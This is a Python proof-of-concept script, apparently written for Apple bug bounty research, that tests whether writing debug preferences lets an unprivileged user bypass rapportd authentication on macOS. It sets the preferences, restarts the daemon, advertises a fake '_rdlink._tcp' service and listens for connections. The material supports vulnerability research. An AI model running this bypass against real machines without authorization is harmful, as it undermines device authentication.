#!/usr/bin/env python3
"""
rapportd Preference Bypass Probe

Tests whether debug preferences in the user preferences domain
can bypass rapportd's security checks without any special privileges.

Two specific preferences:
  1. _prefIgnoreRemoteDisplayChecks - bypasses auth checks on _rdlink._tcp
  2. _prefServerBonjourOpportunitistic - forces rapportd to start its TCP listener

Attack scenario: Any user-level process (even sandboxed via defaults write
or CFPreferencesSetAppValue with appropriate entitlement) can set these prefs.
If rapportd reads them from the USER preferences domain (not system), any
process can bypass rapportd's authentication.

Apple Bug Bounty research - authorized testing only.
"""
import subprocess
import time
import sys
import os
import socket

RAPPORT_DOMAIN = 'com.apple.rapportd'

def run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout + r.stderr).strip()
    except Exception as e:
        return str(e)

def get_rapportd_pid():
    try:
        return int(subprocess.check_output(['pgrep', 'rapportd'], text=True).strip().split()[0])
    except:
        return None

def get_rapportd_mem(pid):
    try:
        return int(subprocess.check_output(['ps', '-o', 'rss=', '-p', str(pid)], text=True).strip())
    except:
        return 0

def get_listening_ports():
    """Return set of listening TCP ports on the system"""
    out = run('netstat -an -p tcp | grep LISTEN', timeout=5)
    ports = set()
    for line in out.splitlines():
        parts = line.split()
        for p in parts:
            if ':' in p:
                try:
                    ports.add(int(p.split(':')[-1]))
                except:
                    pass
    return ports

def read_pref(key):
    """Read a preference from rapportd domain"""
    out = run('defaults read %s %s 2>/dev/null' % (RAPPORT_DOMAIN, key))
    return out

def write_pref(key, value):
    """Write a preference to rapportd user domain"""
    if isinstance(value, bool):
        v = '-bool YES' if value else '-bool NO'
    elif isinstance(value, int):
        v = '-int %d' % value
    else:
        v = '-string "%s"' % value
    return run('defaults write %s %s %s' % (RAPPORT_DOMAIN, key, v))

def delete_pref(key):
    """Delete a preference from rapportd domain"""
    return run('defaults delete %s %s 2>/dev/null' % (RAPPORT_DOMAIN, key))

def advertise_rdlink(name, port, rpfl='98304', rphi='TestDevice', rphn='TestHost', rpha='', extra_duration=10):
    """Advertise _rdlink._tcp with TXT records"""
    cmd_parts = ['dns-sd', '-R', name, '_rdlink._tcp', 'local', str(port),
                 'rpFl=%s' % rpfl, 'rpHI=%s' % rphi, 'rpHN=%s' % rphn,
                 'rpHA=%s' % rpha, 'rpMd=iPhone16,2', 'rpVr=1.0']
    print('  Advertising: %s' % ' '.join(cmd_parts), flush=True)
    proc = subprocess.Popen(cmd_parts, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(extra_duration)
    proc.terminate()
    proc.wait()
    return proc

def check_rapportd_logs(seconds=10):
    """Get recent rapportd log entries"""
    return run(
        'log show --predicate \'process == "rapportd"\' --last %ds 2>/dev/null | '
        'grep -vE "WiFiManagerClient" | head -30' % seconds,
        timeout=seconds + 5
    )

def main():
    print("=== rapportd Preference Bypass Probe ===", flush=True)

    pid = get_rapportd_pid()
    if not pid:
        print("ERROR: rapportd not running!", flush=True)
        sys.exit(1)

    print("rapportd PID: %d" % pid, flush=True)
    print("Initial memory: %d KB" % get_rapportd_mem(pid), flush=True)

    # ================================================================
    # Step 1: Baseline - what does rapportd's preference domain contain?
    # ================================================================
    print("\n=== STEP 1: rapportd User Preferences (Baseline) ===", flush=True)
    all_prefs = run('defaults read %s 2>/dev/null' % RAPPORT_DOMAIN)
    print("Current prefs: %s" % (all_prefs or "(empty / none)"), flush=True)

    print("\nPref file location:", flush=True)
    pref_paths = [
        os.path.expanduser('~/Library/Preferences/%s.plist' % RAPPORT_DOMAIN),
        '/Library/Preferences/%s.plist' % RAPPORT_DOMAIN,
    ]
    for p in pref_paths:
        print("  %s: %s" % (p, "EXISTS" if os.path.exists(p) else "not found"), flush=True)

    # ================================================================
    # Step 2: Can we write to rapportd preferences?
    # ================================================================
    print("\n=== STEP 2: Write Test ===", flush=True)
    result = write_pref('_prefSecurityTestWriteCheck', True)
    read_back = read_pref('_prefSecurityTestWriteCheck')
    print("Write result: '%s'" % result, flush=True)
    print("Read back: '%s'" % read_back, flush=True)

    if read_back.strip() == '1':
        print("[+] CONFIRMED: Can write to rapportd user preferences WITHOUT root!", flush=True)
    else:
        print("[-] Write failed or couldn't read back", flush=True)

    delete_pref('_prefSecurityTestWriteCheck')

    # ================================================================
    # Step 3: Test _prefIgnoreRemoteDisplayChecks bypass
    # ================================================================
    print("\n=== STEP 3: _prefIgnoreRemoteDisplayChecks Bypass ===", flush=True)

    # First, baseline: advertise without the pref and check if rapportd connects
    print("\n[3a] Baseline: advertising _rdlink._tcp WITHOUT bypass pref", flush=True)
    ports_before = get_listening_ports()

    # Start a TCP server to catch incoming connections
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('0.0.0.0', 9998))
    server_sock.listen(5)
    server_sock.settimeout(8)
    print("  TCP server listening on port 9998", flush=True)

    advertise_rdlink('BypassTest', 9998, extra_duration=8)

    try:
        conn, addr = server_sock.accept()
        print("[!] BASELINE CONNECTION from %s:%d - unexpected!" % addr, flush=True)
        data = conn.recv(1024)
        print("  Initial data: %s" % data.hex(), flush=True)
        conn.close()
    except socket.timeout:
        print("  No connection (expected - device not recognized)", flush=True)

    # ================================================================
    # Now set the bypass preference
    # ================================================================
    print("\n[3b] Setting _prefIgnoreRemoteDisplayChecks = YES", flush=True)
    write_pref('_prefIgnoreRemoteDisplayChecks', True)
    read_back = read_pref('_prefIgnoreRemoteDisplayChecks')
    print("  Pref value: %s" % read_back, flush=True)

    # Kill rapportd to force preference re-read at restart
    print("\n[3c] Killing rapportd to force restart with new prefs", flush=True)
    run('killall -HUP rapportd 2>/dev/null || true')
    time.sleep(3)
    new_pid = get_rapportd_pid()
    print("  rapportd new PID: %s" % new_pid, flush=True)
    if new_pid:
        pid = new_pid

    # Re-verify preference was kept
    read_back2 = read_pref('_prefIgnoreRemoteDisplayChecks')
    print("  Pref after restart: %s" % read_back2, flush=True)

    # ================================================================
    # Step 3d: Test with bypass enabled - does rapportd connect now?
    # ================================================================
    print("\n[3d] Advertising _rdlink._tcp WITH bypass pref enabled", flush=True)

    # Make sure previous server socket is closed
    try:
        server_sock.close()
    except Exception:
        pass
    time.sleep(1)

    server_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock2.bind(('0.0.0.0', 9998))
    server_sock2.listen(5)
    server_sock2.settimeout(10)
    print("  TCP server listening on port 9998", flush=True)

    advertise_rdlink('BypassTest2', 9998, extra_duration=10)

    connected = False
    try:
        conn, addr = server_sock2.accept()
        connected = True
        print("\n[!!!] BYPASS CONNECTION ESTABLISHED from %s:%d!" % addr, flush=True)
        data = conn.recv(4096)
        if data:
            print("  First bytes (hex): %s" % data[:64].hex(), flush=True)
            print("  First bytes (text): %s" % data[:64], flush=True)
        conn.close()
    except socket.timeout:
        print("  No connection - bypass pref may not affect authentication", flush=True)

    server_sock2.close()

    # ================================================================
    # Step 4: Test _prefServerBonjourOpportunitistic
    # ================================================================
    print("\n=== STEP 4: _prefServerBonjourOpportunitistic ===", flush=True)
    print("Setting _prefServerBonjourOpportunitistic = YES", flush=True)
    write_pref('_prefServerBonjourOpportunitistic', True)
    run('killall -HUP rapportd 2>/dev/null || true')
    time.sleep(5)

    # Check if rapportd now has TCP listener
    print("Checking for new TCP listeners...", flush=True)
    ports_after = get_listening_ports()
    new_ports = ports_after - ports_before
    if new_ports:
        print("[!] NEW LISTENING PORTS: %s" % new_ports, flush=True)
    else:
        print("  No new listening ports", flush=True)

    new_pid2 = get_rapportd_pid()
    print("rapportd PID: %s" % new_pid2, flush=True)

    # Check rapportd's network sockets now
    if new_pid2:
        print("rapportd sockets:", flush=True)
        socks = run('lsof -p %s -i -n -P 2>/dev/null' % new_pid2)
        print(socks or "(none)", flush=True)

    # ================================================================
    # Step 5: Check logs for any security bypass signals
    # ================================================================
    print("\n=== STEP 5: rapportd logs ===", flush=True)
    logs = check_rapportd_logs(seconds=30)
    print(logs or "(no relevant logs)", flush=True)

    # ================================================================
    # Cleanup
    # ================================================================
    print("\n=== CLEANUP ===", flush=True)
    delete_pref('_prefIgnoreRemoteDisplayChecks')
    delete_pref('_prefServerBonjourOpportunitistic')
    print("Preferences cleaned up.", flush=True)

    # ================================================================
    # Step 6: Full entitlement dump via otool
    # ================================================================
    print("\n=== STEP 6: Full rapportd entitlements ===", flush=True)
    out = run('codesign -d --entitlements - /usr/libexec/rapportd 2>/dev/null')
    print(out[:3000] if len(out) > 3000 else out, flush=True)

    if connected:
        print("\n[!!!!] CRITICAL: _prefIgnoreRemoteDisplayChecks BYPASS WORKED!", flush=True)
        print("Any local user can bypass rapportd authentication by writing a user preference.", flush=True)
    else:
        print("\nPreference bypass did not enable unauthenticated connection.", flush=True)

if __name__ == '__main__':
    main()
